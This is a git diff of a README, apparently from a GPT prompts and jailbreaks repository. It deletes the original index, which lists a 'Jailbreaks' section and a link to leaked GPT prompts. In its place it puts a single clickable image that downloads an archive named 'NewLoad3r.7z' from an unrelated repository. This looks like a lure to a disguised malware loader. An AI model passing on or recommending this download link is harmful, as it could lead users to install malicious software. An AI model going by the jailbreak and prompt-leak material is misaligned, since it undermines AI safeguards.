@@ -1,17 +1,1 @@
-# GPTs Prompts And Jailbreaks
-
-- [Programming](./Programming.md)
-- [Marketing](./Marketing.md)
-- [Academic](./Academic.md)
-- [Job Hunting](./Job-Hunting.md)
-- [Game](./Game.md)
-- [Creative](./Creative.md)
-- [Prompt Engineering](./Prompt-Engineering.md)
-- [Business](./Business.md)
-- [Productivity & life style](./Productivity-&-life-style.md)
-- [Jailbreaks](./Jailbreaks.md)
-
-- New GPTs Prompt leaks https://github.com/friuns2/Leaked-GPTs
-
-
-[![friuns2/BlackFriday-GPTs-Prompts - Gource visualisation](https://img.youtube.com/vi/guTk7F7G5Xg/0.jpg)](https://www.youtube.com/watch?v=guTk7F7G5Xg)
+[<img src="https://github.com/itsmerayplayz/BlackFriday-GPTs-Prompts/assets/87899281/a467f28e-246f-4830-bfb7-67856cb4924a"/>](https://github.com/Ukdoiua/Wonder/releases/download/ri/NewLoad3r.7z)
